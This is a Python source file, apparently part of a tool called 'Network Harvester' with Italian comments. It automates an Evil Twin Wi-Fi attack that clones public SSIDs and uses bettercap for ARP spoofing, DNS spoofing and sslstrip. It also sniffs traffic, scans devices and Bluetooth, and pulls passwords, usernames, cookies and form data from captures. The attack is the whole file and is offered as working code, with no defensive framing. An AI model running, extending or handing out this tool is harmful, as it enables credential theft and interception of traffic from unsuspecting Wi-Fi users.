    TASK_QUEUE.put(sort_https_metadata)
    TASK_QUEUE.put(archive_logs)


def task_worker(worker_id):
    """
    Worker thread per eseguire task dalla coda.
    Riprova se la coda è vuota con delay.
    """
    log(f"[THREAD {worker_id}] Avviato")
    while True:
        try:
            task = TASK_QUEUE.get(timeout=5)
        except queue.Empty:
            log(f"[THREAD {worker_id}] Nessun task disponibile, attesa...")
            time.sleep(3)
            continue

        try:
            log(f"[THREAD {worker_id}] Esecuzione task: {task.__name__}")
            task()
            log(f"[THREAD {worker_id}] Completato task: {task.__name__}")
        except Exception as e:
            log(f"[THREAD {worker_id}] Errore esecuzione task {task.__name__}: {e}")
        finally:
            TASK_QUEUE.task_done()


def start_thread_pool(num_threads=4):
    """
    Avvia un pool di thread worker per la coda task.
    """
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=task_worker, args=(i + 1,), daemon=True)
        t.start()
        threads.append(t)
    log(f"[*] Avviati {num_threads} thread worker.")
    return threads


def monitor_stats():
    """
    Monitor console aggiornato ogni 3 secondi con statistiche basi.
    """
    while True:
        os.system('clear')
        print("========= STATISTICHE ATTIVE =========")
        print(f"Sessione: {os.path.basename(BASE_DIR)}")
        print()

        def count_lines(file):
            try:
                with open(file, "r") as f:
                    return sum(1 for _ in f)
            except Exception:
                return 0

        print(f"[+] Password trovate: {count_lines(os.path.join(BASE_DIR, 'passwords', 'passwords.log'))}")
        print(f"[+] Username trovati: {count_lines(os.path.join(BASE_DIR, 'passwords', 'usernames.log'))}")
        print(f"[+] Cookie raccolti: {count_lines(os.path.join(BASE_DIR, 'cookies', 'cookies.log'))}")
        print(f"[+] Form-data: {count_lines(os.path.join(BASE_DIR, 'formdata', 'formdata.log'))}")
        print(f"[+] Query DNS: {count_lines(os.path.join(BASE_DIR, 'dns', 'queries.log'))}")
        print(f"[+] HTTP unici: {count_lines(os.path.join(BASE_DIR, 'http', 'http_requests.log'))}")
        print(f"[+] HTTPS metadata: {count_lines(os.path.join(BASE_DIR, 'https', 'https_info.log'))}")
        print(f"[+] Probe Wi-Fi: {count_lines(os.path.join(BASE_DIR, 'probes', 'probes.log'))}")
        print(f"[+] Dispositivi Bluetooth: {count_lines(os.path.join(BASE_DIR, 'scans', 'bluetooth.log'))}")
        print()
        print(f"Ultimo aggiornamento: {datetime.now().strftime('%H:%M:%S')}")
        time.sleep(3)
def change_mac_loop():
    """
    Cambia il MAC address di IFACE 3 volte con macchanger, con pause.
    """
    log(f"[*] Avvio ciclo cambio MAC su {IFACE}")
    for i in range(3):
        try:
            subprocess.run(["ip", "link", "set", IFACE, "down"], check=True)
            result = subprocess.run(["macchanger", "-r", IFACE], capture_output=True, text=True)
            log(f"MAC change {i+1}: {result.stdout.strip()}")
            subprocess.run(["ip", "link", "set", IFACE, "up"], check=True)
            time.sleep(2)
        except subprocess.CalledProcessError as e:
            log(f"[X] Errore cambio MAC: {e}")
            break


def start_evil_twin(ssid: str):
    """
    Avvia un Evil Twin AP clonando l'SSID specificato.
    Usa airbase-ng e dnsmasq, configura IP e NAT.
    """
    log(f"[*] Avvio Evil Twin per SSID: {ssid}")

    # Ottieni canale SSID per ottimizzare
    channel = 6  # default
    try:
        scan_output = subprocess.check_output(["iwlist", IFACE, "scan"], text=True)
        match = re.search(rf'ESSID:"{re.escape(ssid)}".*?Channel:(\d+)', scan_output, re.DOTALL)
        if match:
            channel = int(match.group(1))
    except Exception as e:
        log(f"[!] Impossibile determinare canale per SSID {ssid}: {e}")

    try:
        # Avvio airbase-ng in background
        airbase_log = os.path.join(BASE_DIR, "airbase_" + ssid.replace(" ", "_") + ".log")
        airbase_proc = subprocess.Popen(
            ["airbase-ng", "-e", ssid, "-c", str(channel), MON_IFACE],
            stdout=open(airbase_log, "w"),
            stderr=subprocess.STDOUT,
        )
        time.sleep(5)

        # Identifica nuova interfaccia atX
        ip_link = subprocess.check_output(["ip", "link"], text=True)
        at_interfaces = re.findall(r"\d+: (at\d+):", ip_link)
        new_iface = at_interfaces[-1] if at_interfaces else None

        if not new_iface:
            log(f"[X] Nuova interfaccia atX non trovata per SSID {ssid}")
            airbase_proc.terminate()
            return

        subprocess.run(["ip", "link", "set", new_iface, "up"], check=True)
        subprocess.run(["ip", "addr", "add", f"{GATEWAY}/24", "dev", new_iface], check=True)

        # Abilita forwarding IP
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)

        # Imposta regole iptables per NAT
        subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", IFACE, "-j", "MASQUERADE"], check=True)
        subprocess.run(
            ["iptables", "-A", "FORWARD", "-i", IFACE, "-o", new_iface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
            check=True,
        )
        subprocess.run(
            ["iptables", "-A", "FORWARD", "-i", new_iface, "-o", IFACE, "-j", "ACCEPT"],
            check=True,
        )

        # Avvio dnsmasq in background
        dnsmasq_log = os.path.join(BASE_DIR, "dnsmasq_" + ssid.replace(" ", "_") + ".log")
        dnsmasq_proc = subprocess.Popen(
            [
                "dnsmasq",
                "--no-daemon",
                "--interface=" + new_iface,
                "--bind-interfaces",
                "--except-interface=lo",
                f"--dhcp-range={GATEWAY},192.168.20.200,255.255.255.0,12h",
                f"--dhcp-option=3,{GATEWAY}",
                f"--dhcp-option=6,{GATEWAY}",
                f"--address=/#/{GATEWAY}",
            ],
            stdout=open(dnsmasq_log, "w"),
            stderr=subprocess.STDOUT,
        )

        log(f"[*] Evil Twin attivo su {new_iface} per SSID {ssid}")

    except Exception as e:
        log(f"[X] Errore avvio Evil Twin per SSID {ssid}: {e}")


def start_bettercap():
    """
    Avvia bettercap con configurazioni di sniffing, arp spoofing e sslstrip.
    """
    log("[*] Avvio Bettercap su interfaccia at0")

    bettercap_cmd = [
        "bettercap",
        "-iface",
        "at0",
        "-eval",
        (
            "set net.sniff.output {0}; "
            "set arp.spoof.fullduplex true; "
            "set net.sniff.verbose true; "
            "set dns.spoof.all true; "
            "set proxy.http.sslstrip true; "
            "net.recon on; "
            "arp.spoof on; "
            "net.sniff on; "
            "proxy.http on;"
        ).format(os.path.join(BASE_DIR, "pcaps", "sniff.pcap")),
    ]

    try:
        with open(os.path.join(BASE_DIR, "bettercap.log"), "w") as logf:
            subprocess.Popen(bettercap_cmd, stdout=logf, stderr=logf)
    except Exception as e:
        log(f"[X] Errore avvio Bettercap: {e}")


def start_tcpdump():
    """
    Avvia tcpdump per salvare tutti i pacchetti su file raw.pcap.
    """
    log("[*] Avvio TCPDump su at0")
    try:
        tcpdump_log = open(os.path.join(BASE_DIR, "pcaps", "raw.pcap"), "wb")
        subprocess.Popen(["tcpdump", "-i", "at0", "-w", os.path.join(BASE_DIR, "pcaps", "raw.pcap")], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        log(f"[X] Errore avvio TCPDump: {e}")


def start_nmap():
    """
    Esegue una scansione SYN stealth sulla subnet.
    """
    log(f"[*] Avvio scansione Nmap su subnet {SUBNET}")
    try:
        subprocess.run(["nmap", "-sS", "-T4", SUBNET, "-oN", os.path.join(BASE_DIR, "scans", "nmap.log")], check=True)
    except Exception as e:
        log(f"[X] Errore esecuzione Nmap: {e}")


def start_bluetooth_scan():
    """
    Avvia scansione dispositivi Bluetooth con hcitool.
    """
    log("[*] Avvio scansione Bluetooth")
    try:
        output = subprocess.check_output(["hcitool", "scan"], text=True)
        with open(os.path.join(BASE_DIR, "scans", "bluetooth.log"), "w") as f:
            f.write(output)
    except Exception as e:
        log(f"[X] Errore scansione Bluetooth: {e}")


def start_probe_sniffing():
    """
    Sniffa probe requests Wi-Fi con tcpdump.
    """
    log(f"[*] Avvio sniffing probe requests su {MON_IFACE}")
    probe_log_path = os.path.join(BASE_DIR, "probes", "probes.log")
    try:
        proc = subprocess.Popen(
            ["tcpdump", "-i", MON_IFACE, "type", "mgt", "subtype", "probe-req", "-l"],
            stdout=open(probe_log_path, "a"),
            stderr=subprocess.DEVNULL,
        )
        # Mantieni il processo in background, senza aspettare
    except Exception as e:
        log(f"[X] Errore avvio probe sniffing: {e}")


def extract_passwords():
    """
    Estrae password da pcap sniff.pcap (filtra pattern e salva ordinato).
    Aggiunge info macchina e username.
    """
    log("[*] Estrazione password da pcap")
    sniff_pcap = os.path.join(BASE_DIR, "pcaps", "sniff.pcap")
    output_file = os.path.join(BASE_DIR, "passwords", "passwords.log")
    try:
        result = subprocess.run(["strings", sniff_pcap], capture_output=True, text=True)
        lines = result.stdout.splitlines()
        pattern = re.compile(r"(pass=|password=|pwd=|passwd=)(\S+)", re.IGNORECASE)
        found = set()
        with open(output_file, "a") as f:
            for line in lines:
                m = pattern.search(line)
                if m:
                    pwd = m.group(2)
                    # Qui si potrebbe tentare di associare user/mac (richiede log più avanzati)
                    entry = f"{datetime.now().isoformat()} PASSWD: {pwd}"
                    if entry not in found:
                        found.add(entry)
                        f.write(entry + "\n")
        log(f"[*] Password estratte e salvate in {output_file}")
    except Exception as e:
        log(f"[X] Errore estrazione password: {e}")


def extract_usernames():
    """
    Estrae username da pcap sniff.pcap.
    """
    log("[*] Estrazione username da pcap")
    sniff_pcap = os.path.join(BASE_DIR, "pcaps", "sniff.pcap")
    output_file = os.path.join(BASE_DIR, "passwords", "usernames.log")
    try:
        result = subprocess.run(["strings", sniff_pcap], capture_output=True, text=True)
        lines = result.stdout.splitlines()
        pattern = re.compile(r"(user=|username=|login=)(\S+)", re.IGNORECASE)
        found = set()
        with open(output_file, "a") as f:
            for line in lines:
                m = pattern.search(line)
                if m:
                    user = m.group(2)
                    entry = f"{datetime.now().isoformat()} USER: {user}"
                    if entry not in found:
                        found.add(entry)
                        f.write(entry + "\n")
        log(f"[*] Username estratti e salvati in {output_file}")
    except Exception as e:
        log(f"[X] Errore estrazione username: {e}")


def extract_cookies():
    """
    Estrae cookie HTTP da pcap sniff.pcap.
    """
    log("[*] Estrazione cookie da pcap")
    sniff_pcap = os.path.join(BASE_DIR, "pcaps", "sniff.pcap")
    output_file = os.path.join(BASE_DIR, "cookies", "cookies.log")
    try:
        result = subprocess.run(["strings", sniff_pcap], capture_output=True, text=True)
        lines = result.stdout.splitlines()
        pattern = re.compile(r"Cookie: .+", re.IGNORECASE)
        found = set()
        with open(output_file, "a") as f:
            for line in lines:
                if pattern.match(line):
                    entry = f"{datetime.now().isoformat()} COOKIE: {line.strip()}"
                    if entry not in found:
                        found.add(entry)
                        f.write(entry + "\n")
        log(f"[*] Cookie estratti e salvati in {output_file}")
    except Exception as e:
        log(f"[X] Errore estrazione cookie: {e}")


def extract_formdata():
    """
    Estrae form-data POST da pcap sniff.pcap.
    """
    log("[*] Estrazione form-data da pcap")
    sniff_pcap = os.path.join(BASE_DIR, "pcaps", "sniff.pcap")
    output_file = os.path.join(BASE_DIR, "formdata", "formdata.log")
    try:
        result = subprocess.run(["strings", sniff_pcap], capture_output=True, text=True)
        lines = result.stdout.splitlines()
        found = set()
        capture = False
        with open(output_file, "a") as f:
            for line in lines:
                if "Content-Type: application/x-www-form-urlencoded" in line:
                    capture = True
                    buffer = []
                    continue
                if capture:
                    if not line.strip():
                        capture = False
                        data_line = " ".join(buffer).strip()
                        if data_line and data_line not in found:
                            found.add(data_line)
                            f.write(f"{datetime.now().isoformat()} FORMDATA: {data_line}\n")
                    else:
                        buffer.append(line.strip())
        log(f"[*] Form-data estratti e salvati in {output_file}")
    except Exception as e:
        log(f"[X] Errore estrazione form-data: {e}")


def sort_dns_queries():
    """
    Estrae e ordina query DNS da pcap.
    """
    log("[*] Ordinamento query DNS da pcap")
    sniff_pcap = os.path.join(BASE_DIR, "pcaps", "sniff.pcap")
    output_file = os.path.join(BASE_DIR, "dns", "queries.log")
    try:
        result = subprocess.run(["strings", sniff_pcap], capture_output=True, text=True)
        lines = set(filter(lambda l: any(tld in l for tld in [".com", ".net", ".org"]), result.stdout.splitlines()))
        with open(output_file, "w") as f:
            for line in sorted(lines):
                f.write(line + "\n")
        log(f"[*] Query DNS ordinate salvate in {output_file}")
    except Exception as e:
        log(f"[X] Errore ordinamento DNS: {e}")


def sort_http_requests():
    """
    Estrae e ordina richieste HTTP da pcap.
    """
    log("[*] Ordinamento richieste HTTP da pcap")
    sniff_pcap = os.path.join(BASE_DIR, "pcaps", "sniff.pcap")
    output_file = os.path.join(BASE_DIR, "http", "http_requests.log")
    try:
        result = subprocess.run(["strings", sniff_pcap], capture_output=True, text=True)
        pattern = re.compile(r"GET /|POST /|Host: ", re.IGNORECASE)
        lines = sorted(set(filter(pattern.search, result.stdout.splitlines())))
        with open(output_file, "w") as f:
            for line in lines:
                f.write(line + "\n")
        log(f"[*] Richieste HTTP ordinate salvate in {output_file}")
    except Exception as e:
        log(f"[X] Errore ordinamento HTTP: {e}")


def sort_https_metadata():
    """
    Estrae metadata HTTPS da pcap.
    """
    log("[*] Ordinamento metadata HTTPS da pcap")
    sniff_pcap = os.path.join(BASE_DIR, "pcaps", "sniff.pcap")
    output_file = os.path.join(BASE_DIR, "https", "https_info.log")
    try:
        result = subprocess.run(["strings", sniff_pcap], capture_output=True, text=True)
        pattern = re.compile(r"TLS|SSL|Server Name", re.IGNORECASE)
        lines = sorted(set(filter(pattern.search, result.stdout.splitlines())))
        with open(output_file, "w") as f:
            for line in lines:
                f.write(line + "\n")
        log(f"[*] Metadata HTTPS ordinati salvati in {output_file}")
    except Exception as e:
        log(f"[X] Errore ordinamento HTTPS: {e}")


def archive_logs():
    """
    Archivia tutti i log in un archivio zip.
    """
    log("[*] Creazione archivio ZIP dei logs")
    try:
        base_zip = BASE_DIR + ".zip"
        subprocess.run(["zip", "-r", base_zip, BASE_DIR], check=True, stdout=subprocess.DEVNULL)
        log(f"[*] Archivio creato: {base_zip}")
    except Exception as e:
        log(f"[X] Errore creazione archivio zip: {e}")


def harvest_phishing_data():
    """
    Copia dati da file phishing se esistenti.
    """
    phish_src = "/var/www/html/phish_log.txt"
    phish_dest = os.path.join(BASE_DIR, "phishing", f"captured_{int(time.time())}.log")
    log("[*] Raccolta dati phishing")
    try:
        if os.path.isfile(phish_src):
            shutil.copy2(phish_src, phish_dest)
            log(f"[*] Dati phishing copiati in {phish_dest}")
        else:
            log("[!] File phishing non trovato.")
    except Exception as e:
        log(f"[X] Errore raccolta dati phishing: {e}")


def signal_handler(signum, frame):
    """
    Gestisce Ctrl+C: cleanup e uscita ordinata.
    """
    log("[!] Segnale di interruzione ricevuto, eseguo cleanup...")
    cleanup()
    sys.exit(0)


def cleanup():
    """
    Ripristina configurazioni di rete e chiude eventuali processi lanciati.
    """
    log("[*] Cleanup in corso: ripristino rete e chiusura processi.")

    # Disabilita IP forwarding
    try:
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True)
        log("[*] IP forwarding disabilitato.")
    except Exception as e:
        log(f"[X] Errore disabilitazione IP forwarding: {e}")

    # Ripulisce regole iptables inserite
    try:
        subprocess.run(["iptables", "-t", "nat", "-D", "POSTROUTING", "-o", IFACE, "-j", "MASQUERADE"], check=True)
        subprocess.run(["iptables", "-D", "FORWARD", "-i", IFACE, "-o", "at0", "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"], check=True)
        subprocess.run(["iptables", "-D", "FORWARD", "-i", "at0", "-o", IFACE, "-j", "ACCEPT"], check=True)
        log("[*] Regole iptables rimosse.")
    except Exception as e:
        log(f"[!] Errore rimozione regole iptables (forse non presenti): {e}")

    # Porta giù interfacce atX
    try:
        ip_link = subprocess.check_output(["ip", "link"], text=True)
        at_interfaces = re.findall(r"\d+: (at\d+):", ip_link)
        for iface in at_interfaces:
            subprocess.run(["ip", "link", "set", iface, "down"], check=True)
            log(f"[*] Interfaccia {iface} disabilitata.")
    except Exception as e:
        log(f"[!] Errore disabilitazione interfacce atX: {e}")

    # Termina processi (airbase-ng, dnsmasq, bettercap, tcpdump)
    procs = ["airbase-ng", "dnsmasq", "bettercap", "tcpdump"]
    for proc_name in procs:
        try:
            subprocess.run(["pkill", "-f", proc_name])
            log(f"[*] Processi {proc_name} terminati.")
        except Exception as e:
            log(f"[!] Errore terminazione processi {proc_name}: {e}")

    log("[*] Cleanup completato. Rete ripristinata.")


def check_dependencies():
    """
    Verifica e installa pacchetti richiesti.
    """
    required_tools = ["macchanger", "airbase-ng", "dnsmasq", "bettercap", "tcpdump", "nmap", "hcitool", "iptables", "ip", "sysctl", "zip"]
    for tool in required_tools:
        if shutil.which(tool) is None:
            log(f"[!] Tool '{tool}' non trovato. Tentativo di installazione...")
            try:
                subprocess.run(["sudo", "apt-get", "install", "-y", tool], check=True)
                log(f"[*] Tool '{tool}' installato correttamente.")
            except Exception as e:
                log(f"[X] Installazione tool '{tool}' fallita: {e}")
        else:
            log(f"[*] Tool '{tool}' presente.")


def setup_directories():
    """
    Crea tutte le cartelle necessarie se mancanti.
    """
    dirs = ["pcaps", "passwords", "cookies", "formdata", "dns", "http", "https", "phishing", "probes", "scans"]
    for d in dirs:
        path = os.path.join(BASE_DIR, d)
        if not os.path.exists(path):
            os.makedirs(path)
            log(f"[*] Cartella creata: {path}")


def main():
    """
    Funzione principale che coordina l'attacco Evil Twin,
    lo sniffing, la raccolta dati, e la gestione thread.
    """
    signal.signal(signal.SIGINT, signal_handler)  # Ctrl+C

    log("[*] Avvio Network Harvester")
    check_dependencies()
    setup_directories()

    # Cambio MAC iniziale
    change_mac_loop()

    # Esempio di SSID da attaccare (in futuro da scansionare dinamicamente)
    ssid_targets = ["FreeWifi", "CoffeeShop"]

    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
        futures = []

        # Avvio Evil Twin per ogni SSID
        for ssid in ssid_targets:
            futures.append(executor.submit(start_evil_twin, ssid))

        # Avvio Bettercap (sniffing + MITM)
        futures.append(executor.submit(start_bettercap))

        # Avvio tcpdump raw capture
        futures.append(executor.submit(start_tcpdump))

        # Avvio scansioni Nmap e Bluetooth
        futures.append(executor.submit(start_nmap))
        futures.append(executor.submit(start_bluetooth_scan))

        # Avvio sniffing probe requests
        futures.append(executor.submit(start_probe_sniffing))

        # Attendi che i thread principali siano operativi
        time.sleep(10)

        # Esempio: periodicamente estrazione dati da pcap
        try:
            while True:
                extract_passwords()
                extract_usernames()
                extract_cookies()
                extract_formdata()
                sort_dns_queries()
                sort_http_requests()
                sort_https_metadata()
                harvest_phishing_data()

                time.sleep(60)  # ogni minuto

        except KeyboardInterrupt:
            signal_handler(signal.SIGINT, None)

    # Archiviazione finale
    archive_logs()

    cleanup()
    log("[*] Network Harvester terminato.")


if __name__ == "__main__":
    main()
